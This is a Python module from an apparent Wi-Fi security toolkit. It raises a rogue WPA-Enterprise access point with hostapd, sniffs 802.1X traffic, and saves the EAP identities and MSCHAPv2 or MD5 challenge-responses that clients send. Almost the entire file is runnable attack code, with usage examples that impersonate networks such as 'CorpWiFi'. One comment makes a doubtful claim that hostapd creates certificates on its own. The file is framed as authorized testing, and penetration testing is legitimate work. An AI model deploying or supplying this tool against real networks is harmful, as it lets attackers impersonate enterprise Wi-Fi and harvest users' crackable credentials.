#!/usr/bin/env python3
"""
WPA-Enterprise (EAP) Attack Module for Hoover WiFi Security Toolkit
Sets up a rogue WPA-Enterprise AP with EAP authentication to test
whether 802.1X supplicants properly validate server certificates.
For authorized security testing and research only.
"""

import sys
import os
import argparse
import json
import subprocess
import signal
import tempfile
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import Dot11, RadioTap
from scapy.layers.eap import EAP, EAPOL
from scapy.sendrecv import sniff

from utils import validate_interface, require_root, setup_logging


# EAP type constants
EAP_TYPE_IDENTITY = 1
EAP_TYPE_MD5 = 4
EAP_TYPE_PEAP = 25
EAP_TYPE_TTLS = 21
EAP_TYPE_MSCHAPV2 = 26

# EAP code constants
EAP_CODE_REQUEST = 1
EAP_CODE_RESPONSE = 2

SUPPORTED_EAP_METHODS = ("peap", "ttls", "md5")


class EAPAttack:
    """WPA-Enterprise rogue AP for authorized 802.1X security testing.

    Sets up a hostapd-based access point with WPA-Enterprise (EAP)
    authentication to identify supplicants that do not properly
    validate server certificates.
    """

    def __init__(self, interface: str, ssid: str, channel: int = 6,
                 output_dir: str = "captures", timeout: int = 300,
                 eap_method: str = "peap") -> None:
        self.interface: str = interface
        self.ssid: str = ssid
        self.channel: int = channel
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.eap_method: str = eap_method.lower()
        self.logger = setup_logging("eap_attack")
        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._sniffer_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._start_time: Optional[float] = None
        self._running: bool = False
        self._temp_files: list[str] = []
        self.captured_credentials: list[dict] = []
        self._lock = threading.Lock()

    def _generate_hostapd_config(self) -> str:
        """Generate hostapd configuration for WPA-Enterprise AP.

        Returns:
            Hostapd configuration string with 802.1X / WPA-EAP settings.
        """
        config = (
            f"interface={self.interface}\n"
            f"driver=nl80211\n"
            f"ssid={self.ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.channel}\n"
            f"wmm_enabled=0\n"
            f"auth_algs=1\n"
            f"wpa=2\n"
            f"wpa_key_mgmt=WPA-EAP\n"
            f"wpa_pairwise=CCMP\n"
            f"rsn_pairwise=CCMP\n"
            f"ieee8021x=1\n"
            f"eap_server=1\n"
            f"eap_user_file={{eap_user_file}}\n"
            f"ca_cert={{ca_cert}}\n"
            f"server_cert={{server_cert}}\n"
            f"private_key={{private_key}}\n"
        )
        return config

    def _generate_eap_user_file(self) -> str:
        """Generate EAP user file for hostapd's integrated EAP server.

        Returns:
            EAP user file contents as a string.
        """
        lines = [
            "# EAP user file for hostapd EAP server",
            "# Generated by python-hoover eap_attack module",
        ]

        if self.eap_method == "peap":
            lines.append('* PEAP,TTLS,MD5')
            lines.append('"t" MSCHAPV2 "password" [2]')
        elif self.eap_method == "ttls":
            lines.append('* TTLS,PEAP,MD5')
            lines.append('"t" MSCHAPV2,MD5 "password" [2]')
        elif self.eap_method == "md5":
            lines.append('* MD5')
            lines.append('"t" MD5 "password" [2]')
        else:
            # Fallback to PEAP
            lines.append('* PEAP,TTLS,MD5')
            lines.append('"t" MSCHAPV2 "password" [2]')

        return "\n".join(lines) + "\n"

    def packet_handler(self, packet) -> None:
        """Process captured packets looking for EAP exchanges.

        Captures EAP Identity responses and MSCHAP challenge/response
        exchanges from 802.1X supplicants connecting to the rogue AP.

        Args:
            packet: Scapy packet from the sniffer.
        """
        if not packet.haslayer(EAP):
            return

        eap_layer = packet[EAP]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Extract source MAC if Dot11 layer present
        src_mac = None
        if packet.haslayer(Dot11):
            src_mac = packet[Dot11].addr2

        # EAP Identity Response
        if eap_layer.code == EAP_CODE_RESPONSE and eap_layer.type == EAP_TYPE_IDENTITY:
            identity = ""
            if eap_layer.identity is not None:
                identity = (
                    eap_layer.identity.decode("utf-8", errors="replace")
                    if isinstance(eap_layer.identity, bytes)
                    else str(eap_layer.identity)
                )

            cred = {
                "type": "eap_identity",
                "timestamp": timestamp,
                "identity": identity,
                "src_mac": src_mac or "unknown",
                "eap_id": eap_layer.id,
            }

            with self._lock:
                self.captured_credentials.append(cred)
            self.logger.info(
                "EAP Identity Response: %s (MAC: %s)", identity, src_mac or "unknown"
            )

        # MSCHAP challenge/response (type 26 within EAP)
        elif eap_layer.code == EAP_CODE_RESPONSE and eap_layer.type == EAP_TYPE_MSCHAPV2:
            cred = {
                "type": "mschapv2_response",
                "timestamp": timestamp,
                "src_mac": src_mac or "unknown",
                "eap_id": eap_layer.id,
                "raw_data": bytes(eap_layer).hex(),
            }

            with self._lock:
                self.captured_credentials.append(cred)
            self.logger.info(
                "MSCHAPv2 Response captured (MAC: %s)", src_mac or "unknown"
            )

        # MD5-Challenge response
        elif eap_layer.code == EAP_CODE_RESPONSE and eap_layer.type == EAP_TYPE_MD5:
            cred = {
                "type": "md5_challenge_response",
                "timestamp": timestamp,
                "src_mac": src_mac or "unknown",
                "eap_id": eap_layer.id,
                "raw_data": bytes(eap_layer).hex(),
            }

            with self._lock:
                self.captured_credentials.append(cred)
            self.logger.info(
                "EAP-MD5 Challenge Response captured (MAC: %s)", src_mac or "unknown"
            )

    def _run_sniffer(self) -> None:
        """Run the packet sniffer in a background thread."""
        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=0,
                stop_filter=lambda _: self._stop_event.is_set(),
                timeout=self.timeout,
            )
        except Exception as e:
            if not self._stop_event.is_set():
                self.logger.error("Sniffer error: %s", e)

    def start(self) -> None:
        """Start the WPA-Enterprise rogue AP and packet sniffer.

        Sets up hostapd with EAP authentication, starts the packet
        sniffer, and runs until timeout or interrupted.
        """
        if not validate_interface(self.interface):
            self.logger.error("Invalid interface: %s", self.interface)
            sys.exit(1)

        self.logger.info("Starting WPA-Enterprise Attack")
        self.logger.info("  Interface: %s", self.interface)
        self.logger.info("  SSID: %s", self.ssid)
        self.logger.info("  Channel: %d", self.channel)
        self.logger.info("  EAP Method: %s", self.eap_method)
        self.logger.info("  Timeout: %ds", self.timeout)

        def signal_handler(sig, frame):
            self.logger.info("Interrupt received, shutting down...")
            self._stop_event.set()

        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

        # Generate and write EAP user file
        eap_user_content = self._generate_eap_user_file()
        eap_user_file = tempfile.NamedTemporaryFile(
            mode="w", suffix="_eap_users", delete=False
        )
        eap_user_file.write(eap_user_content)
        eap_user_file.close()
        self._temp_files.append(eap_user_file.name)

        # Generate and write hostapd config
        hostapd_config = self._generate_hostapd_config()
        hostapd_config = hostapd_config.replace("{eap_user_file}", eap_user_file.name)
        # For the rogue AP, hostapd generates self-signed certs if paths don't exist
        # In production use, real cert paths would be substituted here
        hostapd_config = hostapd_config.replace("{ca_cert}", "/etc/hostapd/ca.pem")
        hostapd_config = hostapd_config.replace("{server_cert}", "/etc/hostapd/server.pem")
        hostapd_config = hostapd_config.replace("{private_key}", "/etc/hostapd/server.key")

        conf_file = tempfile.NamedTemporaryFile(
            mode="w", suffix="_hostapd_eap.conf", delete=False
        )
        conf_file.write(hostapd_config)
        conf_file.close()
        self._temp_files.append(conf_file.name)

        # Configure interface
        try:
            subprocess.run(
                ["ip", "addr", "flush", "dev", self.interface],
                capture_output=True, timeout=5,
            )
            subprocess.run(
                ["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface],
                capture_output=True, timeout=5,
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True, timeout=5,
            )
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            self.logger.error("Failed to configure interface: %s", e)
            self.stop()
            sys.exit(1)

        # Start hostapd
        try:
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", conf_file.name],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            )
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                self.logger.error("hostapd failed to start")
                self.stop()
                sys.exit(1)
            self.logger.info("hostapd started (WPA-Enterprise, SSID: %s)", self.ssid)
        except FileNotFoundError:
            self.logger.error("hostapd not found. Install with: apt install hostapd")
            self.stop()
            sys.exit(1)

        self._running = True
        self._start_time = time.time()

        # Start sniffer thread
        self._sniffer_thread = threading.Thread(target=self._run_sniffer, daemon=True)
        self._sniffer_thread.start()

        self.logger.info("WPA-Enterprise AP running. Press Ctrl+C to stop.")

        # Wait for timeout or interrupt
        try:
            while not self._stop_event.is_set():
                self._stop_event.wait(timeout=1.0)
                elapsed = time.time() - self._start_time
                if elapsed >= self.timeout:
                    self.logger.info("Timeout reached (%ds)", self.timeout)
                    break
        finally:
            self.stop()

    def stop(self) -> None:
        """Stop the rogue AP and clean up resources."""
        self._stop_event.set()
        self._running = False
        self.logger.info("Shutting down WPA-Enterprise AP...")

        # Terminate hostapd
        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                try:
                    self._hostapd_proc.kill()
                    self._hostapd_proc.wait(timeout=3)
                except Exception:
                    pass
            self._hostapd_proc = None

        # Wait for sniffer thread
        if self._sniffer_thread and self._sniffer_thread.is_alive():
            self._sniffer_thread.join(timeout=5)

        # Clean up temp files
        for tmp in self._temp_files:
            try:
                os.unlink(tmp)
            except OSError:
                pass
        self._temp_files.clear()

        # Save captured credentials
        self._save_credentials()

        self.logger.info(
            "WPA-Enterprise AP stopped. %d credential(s) captured.",
            len(self.captured_credentials),
        )

    def _save_credentials(self) -> None:
        """Save captured credentials to a JSON file in output_dir."""
        if not self.captured_credentials:
            return

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(
                self.output_dir, f"eap_creds_{timestamp}.json"
            )
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(self.captured_credentials, f, indent=2)
            self.logger.info("Credentials saved to %s", filepath)
        except Exception as e:
            self.logger.error("Failed to save credentials: %s", e)

    def get_captured_credentials(self) -> list[dict]:
        """Return a copy of all captured identity/challenge-response pairs.

        Returns:
            List of dicts with credential information.
        """
        with self._lock:
            return list(self.captured_credentials)

    def get_status(self) -> dict:
        """Return current status of the EAP attack.

        Returns:
            Dict with running state, credentials count, and elapsed time.
        """
        elapsed = 0.0
        if self._start_time is not None:
            elapsed = time.time() - self._start_time

        with self._lock:
            cred_count = len(self.captured_credentials)

        return {
            "running": self._running,
            "interface": self.interface,
            "ssid": self.ssid,
            "channel": self.channel,
            "eap_method": self.eap_method,
            "credentials_count": cred_count,
            "elapsed_seconds": round(elapsed, 1),
            "timeout": self.timeout,
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPA-Enterprise Attack - Rogue EAP AP for security testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start with PEAP (default)
  sudo python3 eap_attack.py -i wlan0 -s "CorpWiFi"

  # Use TTLS method on channel 11
  sudo python3 eap_attack.py -i wlan0 -s "Enterprise" -m ttls -ch 11

  # Custom output and timeout
  sudo python3 eap_attack.py -i wlan0 -s "TestNet" -o /tmp/creds -t 600

Note: Requires hostapd installed with EAP support.
      For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface")
    parser.add_argument("-s", "--ssid", required=True,
                        help="SSID to broadcast")
    parser.add_argument("-ch", "--channel", type=int, default=6,
                        help="WiFi channel (default: 6)")
    parser.add_argument("-m", "--method", default="peap",
                        choices=list(SUPPORTED_EAP_METHODS),
                        help="EAP method (default: peap)")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory for captured credentials (default: captures)")
    parser.add_argument("-t", "--timeout", type=int, default=300,
                        help="Timeout in seconds (default: 300)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    attack = EAPAttack(
        interface=args.interface,
        ssid=args.ssid,
        channel=args.channel,
        output_dir=args.output_dir,
        timeout=args.timeout,
        eap_method=args.method,
    )

    if args.verbose:
        attack.logger = setup_logging("eap_attack", verbose=True)

    attack.start()


if __name__ == "__main__":
    main()
